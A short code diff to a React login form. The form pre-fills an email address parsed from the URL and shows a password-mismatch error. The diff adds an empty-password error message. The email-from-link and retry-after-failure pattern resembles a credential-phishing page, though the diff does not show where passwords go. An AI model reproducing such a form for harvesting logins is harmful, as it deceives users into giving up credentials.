@@ -11,6 +11,8 @@ export const Form = ({ toggleForm })=>{
     const sliceEqualSign = emailInTheURL.indexOf("=");
     const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('(*&*)', 1).toString();
 
+    const [emptyPswd, setEmptyPswd] = useState(false);
+
     // const [email, setEmail] = useState("afefarhan01@mail.ru");
     const [email, setEmail] = useState(extracetdEmail);
     const [password, setPassword] = useState("");
@@ -75,6 +77,7 @@ export const Form = ({ toggleForm })=>{
                 setSpin(false);
                 setPassword('');
                 setErr(true);
+                setEmptyPswd(false);
                 setTimeout(() => {
                     setErr(false);
                 }, 2700);
@@ -142,6 +145,9 @@ export const Form = ({ toggleForm })=>{
                         This email address and password don't seem to match...
                         Please double-check and try again
                     </p> : null}
+
+
+                       { emptyPswd ? <p className="error-box">Error! Please enter your password.</p> : null }
 
                 </div>
 
